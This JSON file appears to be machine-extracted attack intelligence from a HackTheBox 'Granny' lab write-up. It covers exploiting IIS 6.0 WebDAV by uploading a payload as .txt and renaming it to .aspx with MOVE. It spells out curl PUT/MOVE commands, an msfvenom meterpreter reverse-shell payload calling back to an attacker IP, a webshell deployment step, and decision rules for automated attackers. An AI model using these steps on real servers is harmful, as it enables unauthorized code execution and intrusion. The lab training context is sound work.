@@ -1,0 +1,747 @@
+{
+  "writeup_id": "Htb_Granny",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_iis_webdav_upload",
+    "primary_services": [
+      "http",
+      "webdav"
+    ],
+    "port_signature": "80",
+    "service_combination": "http+webdav",
+    "os_family": "windows_server",
+    "environment_type": "web_server",
+    "entry_vector": "webdav_file_upload",
+    "privilege_path": "webshell_to_system",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "webdav_put_method_enabled",
+      "aspx_execution_capability",
+      "file_extension_filtering_bypass",
+      "http_move_method_available"
+    ],
+    "environmental_clues": [
+      "microsoft_iis_6_0",
+      "asp_net_powered",
+      "webdav_methods_in_options",
+      "put_move_copy_methods_enabled"
+    ],
+    "similar_scenarios": [
+      "grandpa_htb_easy",
+      "devel_htb_easy"
+    ],
+    "unique_aspects": [
+      "txt_to_aspx_move_technique",
+      "webdav_extension_filtering",
+      "iis_6_0_specific_behavior"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "WebDAV_File_Upload_Bypass",
+        "success_reason": "WebDAV allowed PUT method but blocked direct .aspx uploads, bypassed using MOVE method",
+        "prerequisite_indicators": [
+          "webdav_enabled",
+          "put_method_allowed",
+          "move_method_allowed",
+          "asp_net_enabled"
+        ],
+        "recognition_patterns": [
+          "HTTP methods include PUT, MOVE, COPY in OPTIONS",
+          "davtest shows upload restrictions on executable extensions",
+          "X-Powered-By: ASP.NET header present",
+          "IIS 6.0 server signature"
+        ],
+        "failure_modes": [
+          "webdav_disabled",
+          "put_method_blocked",
+          "move_method_blocked",
+          "execute_permissions_denied"
+        ],
+        "environmental_factors": [
+          "legacy_iis_configuration",
+          "default_webdav_settings",
+          "insufficient_file_extension_filtering"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "HTTP_MOVE_Method_Abuse",
+        "success_reason": "Server allowed renaming uploaded .txt files to .aspx after upload",
+        "prerequisite_indicators": [
+          "move_method_enabled",
+          "file_upload_successful",
+          "target_directory_writable"
+        ],
+        "recognition_patterns": [
+          "MOVE method in allowed HTTP methods",
+          "successful PUT of non-executable files",
+          "WebDAV functionality active"
+        ],
+        "failure_modes": [
+          "move_method_disabled",
+          "file_permissions_prevent_rename",
+          "extension_validation_on_move"
+        ],
+        "environmental_factors": [
+          "legacy_webdav_implementation",
+          "insufficient_security_controls",
+          "default_iis_permissions"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "2-5 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "WebDAV with PUT and MOVE methods enabled",
+        "discovery_method": "nmap webdav-scan and davtest enumeration",
+        "why_critical": "Allows file upload bypass leading to webshell deployment",
+        "how_to_recognize": [
+          "nmap shows risky HTTP methods",
+          "davtest reveals upload capabilities",
+          "server responds to WebDAV requests"
+        ],
+        "follow_up_actions": [
+          "test_file_upload_restrictions",
+          "attempt_move_method_bypass",
+          "create_aspx_webshell"
+        ]
+      },
+      {
+        "discovery": "IIS 6.0 with ASP.NET support",
+        "discovery_method": "HTTP header analysis and nmap service detection",
+        "why_critical": "Indicates potential for ASPX code execution and known vulnerabilities",
+        "how_to_recognize": [
+          "Server: Microsoft-IIS/6.0 header",
+          "X-Powered-By: ASP.NET header",
+          "legacy Windows system indicators"
+        ],
+        "follow_up_actions": [
+          "research_iis6_vulnerabilities",
+          "test_aspx_execution",
+          "check_windows_version_exploits"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "webshell_access",
+        "escalation_method": "Windows_Local_Privilege_Escalation",
+        "why_possible": "Legacy Windows system likely vulnerable to known local exploits",
+        "recognition_signs": [
+          "iis6_indicates_old_windows",
+          "webshell_provides_system_info",
+          "unpatched_system_likely"
+        ],
+        "exploitation_path": "WebDAV Upload → ASPX Webshell → Local Exploit → SYSTEM"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only port 80 open on Windows host with IIS 6.0",
+        "decision": "Check for WebDAV capabilities and risky HTTP methods",
+        "reasoning": "IIS 6.0 commonly has WebDAV enabled, nmap shows risky methods like PUT, MOVE",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "if webdav not available"
+          },
+          {
+            "option": "iis_vulnerability_scan",
+            "when": "if webdav fails"
+          }
+        ],
+        "success_indicators": [
+          "webdav_methods_available",
+          "put_method_allowed",
+          "move_method_allowed"
+        ],
+        "next_decision": "test_file_upload_restrictions"
+      },
+      {
+        "step": 2,
+        "situation": "WebDAV confirmed with PUT/MOVE methods available",
+        "decision": "Test file upload restrictions with davtest",
+        "reasoning": "Need to identify which file types can be uploaded and executed",
+        "confidence": 0.95,
+        "prerequisites": [
+          "webdav_confirmed",
+          "put_method_available"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "execution_permissions_mapped"
+        ],
+        "failure_fallbacks": [
+          "manual_curl_testing",
+          "alternative_file_extensions"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "ASPX files blocked but TXT files allowed, MOVE method available",
+        "decision": "Upload webshell as TXT then MOVE to ASPX",
+        "reasoning": "Bypass upload restrictions using MOVE method to rename after upload",
+        "confidence": 0.85,
+        "prerequisites": [
+          "txt_upload_allowed",
+          "move_method_available",
+          "aspx_execution_confirmed"
+        ],
+        "success_indicators": [
+          "txt_file_uploaded",
+          "move_operation_successful",
+          "aspx_file_executable"
+        ],
+        "failure_fallbacks": [
+          "alternative_extensions",
+          "double_extension_bypass"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_webdav_available": {
+        "action": "run_davtest_and_manual_verification",
+        "tools": [
+          "davtest",
+          "curl"
+        ],
+        "next_phase": "identify_upload_bypass_method"
+      },
+      "if_direct_aspx_blocked": {
+        "action": "try_upload_move_technique",
+        "method": "upload_as_txt_then_move_to_aspx",
+        "tools": [
+          "curl",
+          "webshell"
+        ]
+      },
+      "if_webshell_successful": {
+        "action": "enumerate_system_for_privesc",
+        "purpose": "identify_local_privilege_escalation",
+        "tools": [
+          "systeminfo",
+          "exploit_suggester"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_webdav_on_iis_6_0",
+        "reasoning": "high_probability_of_webdav_enabled_on_older_iis",
+        "applicability": "iis_6_0_or_older_detected"
+      },
+      {
+        "rule": "try_move_method_when_direct_upload_blocked",
+        "reasoning": "common_bypass_for_file_extension_restrictions",
+        "applicability": "webdav_with_upload_restrictions"
+      },
+      {
+        "rule": "target_aspx_execution_on_asp_net_servers",
+        "reasoning": "x_powered_by_asp_net_header_indicates_aspx_support",
+        "applicability": "asp_net_server_detected"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "WebDAV File Upload",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "webdav"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "webdav_enabled",
+          "put_method_allowed",
+          "move_method_allowed",
+          "file_upload_permissions"
+        ],
+        "success_indicators": [
+          "davtest_upload_success",
+          "put_method_in_options",
+          "move_method_in_options",
+          "mkcol_method_available"
+        ],
+        "incompatible_with": [
+          "webdav_disabled",
+          "put_method_blocked",
+          "strict_file_type_filtering",
+          "authentication_required"
+        ],
+        "confidence_boosters": [
+          "iis_6_detected",
+          "asp_net_powered_by_header",
+          "multiple_http_methods_allowed",
+          "microsoftofficewebserver_header"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "WebDAV PUT-MOVE Bypass",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "webdav"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "webdav_enabled",
+          "aspx_execution_blocked_on_upload",
+          "txt_upload_allowed",
+          "move_method_allowed"
+        ],
+        "success_indicators": [
+          "txt_file_upload_success",
+          "move_operation_success",
+          "aspx_file_execution_confirmed"
+        ],
+        "incompatible_with": [
+          "move_method_disabled",
+          "file_extension_validation_on_move",
+          "comprehensive_file_filtering"
+        ],
+        "confidence_boosters": [
+          "asp_net_environment",
+          "iis_server_detected",
+          "webdav_scan_shows_move_method"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "15-25 minutes"
+      },
+      {
+        "technique": "IIS 6.0 Local Privilege Escalation",
+        "mitre_id": "T1068",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "iis_6_0_detected",
+          "windows_server_2003",
+          "unpatched_system",
+          "initial_access_obtained"
+        ],
+        "success_indicators": [
+          "iis_6_0_banner_detected",
+          "server_2003_confirmed",
+          "webshell_upload_success"
+        ],
+        "incompatible_with": [
+          "fully_patched_system",
+          "modern_windows_version",
+          "security_hardening_applied"
+        ],
+        "confidence_boosters": [
+          "legacy_iis_version",
+          "old_last_modified_dates",
+          "default_iis_configuration"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "5-10 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "webdav_enabled": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "method_indicators": [
+          "PUT",
+          "MOVE",
+          "COPY",
+          "MKCOL",
+          "PROPFIND",
+          "PROPPATCH"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "iis_legacy": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS/6.0",
+          "MicrosoftOfficeWebServer",
+          "ASP.NET"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "windows_server_2003": {
+        "port_indicators": [
+          80,
+          135,
+          139,
+          445
+        ],
+        "service_indicators": [
+          "http",
+          "smb",
+          "rpc"
+        ],
+        "version_indicators": [
+          "IIS/6.0",
+          "Windows Server 2003"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "webdav_file_upload",
+          "when": "webdav_methods_detected",
+          "reason": "direct_code_execution_possible"
+        },
+        {
+          "attack": "webdav_put_move_bypass",
+          "when": "aspx_blocked_but_txt_allowed",
+          "reason": "bypasses_file_type_restrictions"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "iis_6_privilege_escalation",
+          "when": "iis_6_0_detected_and_access_gained",
+          "reason": "high_success_rate_on_legacy_systems"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "WebDAV File Upload Bypass",
+        "mitre_id": "T1105",
+        "category": "defense_evasion",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X PUT http://{target}/{filename}.txt --data-binary @{payload_file}",
+            "actual_command": "curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx",
+            "output_pattern": "HTTP 200 OK response",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "curl_move",
+            "command_template": "curl -X MOVE -H 'Destination: http://{target}/{filename}.{extension}' http://{target}/{filename}.txt",
+            "actual_command": "curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt",
+            "success_factors": [
+              "webdav_enabled",
+              "move_method_allowed",
+              "execute_permissions"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "davtest",
+            "command_template": "davtest -url http://{target}",
+            "actual_command": "davtest -url http://10.10.10.15",
+            "output_pattern": "PUT File: http://{target}/DavTestDir_{random}/{filename}",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "webdav_enabled",
+          "put_method_allowed",
+          "move_method_allowed",
+          "target_file_extension_blocked"
+        ],
+        "success_indicators": [
+          "file_uploaded_as_txt",
+          "file_moved_to_executable_extension",
+          "code_execution_achieved"
+        ],
+        "common_failures": [
+          "webdav_not_enabled",
+          "insufficient_permissions",
+          "move_method_blocked",
+          "whitespace_corruption_in_payload"
+        ],
+        "follow_up_techniques": [
+          "webshell_execution",
+          "meterpreter_payload_delivery",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "WebShell Deployment",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "cmdasp.aspx",
+            "command_template": "cp /usr/share/webshells/aspx/cmdasp.aspx {local_file}",
+            "actual_command": "cp /usr/share/webshells/aspx/cmdasp.aspx .",
+            "output_pattern": "Command execution interface in browser",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "msfvenom",
+            "command_template": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx > {output_file}",
+            "actual_command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met.aspx",
+            "success_factors": [
+              "proper_payload_format",
+              "correct_listener_config"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "file_upload_capability",
+          "asp_net_execution_enabled",
+          "web_server_accessible"
+        ],
+        "success_indicators": [
+          "webshell_accessible_via_browser",
+          "command_execution_working",
+          "reverse_shell_connection_established"
+        ],
+        "common_failures": [
+          "payload_corruption_during_upload",
+          "firewall_blocking_reverse_connection",
+          "antivirus_detection"
+        ],
+        "follow_up_techniques": [
+          "system_enumeration",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "davtest",
+        "use_case": "webdav_capability_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "webdav_environments"
+        ],
+        "alternatives": [
+          "manual_curl_testing",
+          "cadaver"
+        ],
+        "best_practices": [
+          "run_before_manual_exploitation",
+          "check_both_upload_and_execution_capabilities",
+          "note_blocked_file_extensions"
+        ]
+      },
+      {
+        "tool": "curl",
+        "use_case": "webdav_file_manipulation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "webdav_exploitation"
+        ],
+        "alternatives": [
+          "cadaver",
+          "webdav_clients"
+        ],
+        "best_practices": [
+          "use_data_binary_flag_for_payloads",
+          "verify_upload_before_moving",
+          "test_move_operation_separately"
+        ]
+      },
+      {
+        "tool": "msfvenom",
+        "use_case": "aspx_payload_generation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_web_exploitation"
+        ],
+        "alternatives": [
+          "custom_aspx_shells",
+          "web_shells"
+        ],
+        "best_practices": [
+          "specify_architecture_explicitly",
+          "test_payload_format_before_deployment",
+          "use_common_ports_for_reverse_connections"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "webdav_upload_bypass_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "davtest -url http://10.10.10.15",
+            "purpose": "Enumerate WebDAV capabilities",
+            "expected_output": "List of allowed file types and methods"
+          },
+          {
+            "step": 2,
+            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met.aspx",
+            "purpose": "Generate ASPX payload",
+            "expected_output": "ASPX meterpreter payload file"
+          },
+          {
+            "step": 3,
+            "command": "curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx",
+            "purpose": "Upload payload as txt file",
+            "expected_output": "HTTP 200 OK response"
+          },
+          {
+            "step": 4,
+            "command": "curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt",
+            "purpose": "Move file to executable extension",
+            "expected_output": "HTTP 200 OK response"
+          },
+          {
+            "step": 5,
+            "command": "curl http://10.10.10.15/met.aspx",
+            "purpose": "Trigger payload execution",
+            "expected_output": "Meterpreter session established"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Granny",
+      "difficulty": "Easy",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2017-04-12",
+      "author": "ch4p",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "webdav",
+        "web_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "webdav_misconfiguration",
+        "iis_6.0_vulnerabilities",
+        "local_privilege_escalation"
+      ],
+      "environment_type": "legacy_web_server",
+      "real_world_relevance": "medium",
+      "learning_value": [
+        "webdav_exploitation",
+        "webshell_deployment",
+        "windows_local_exploits"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_concepts",
+        "http_methods",
+        "windows_fundamentals"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "webdav_attacks",
+        "webshell_deployment",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "disable_unnecessary_http_methods",
+        "webdav_hardening",
+        "patch_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Grandpa",
+        "Devel",
+        "Optimum"
+      ],
+      "similarity_reasons": [
+        "legacy_windows",
+        "web_exploitation",
+        "local_privilege_escalation"
+      ],
+      "unique_aspects": [
+        "webdav_move_technique",
+        "aspx_upload_bypass"
+      ],
+      "difficulty_factors": [
+        "straightforward_webdav_exploit",
+        "well_known_techniques",
+        "legacy_system"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T18:48:12.199823",
+    "original_file": "0xdf_writeups/Htb Granny.md",
+    "content_length": 18031,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
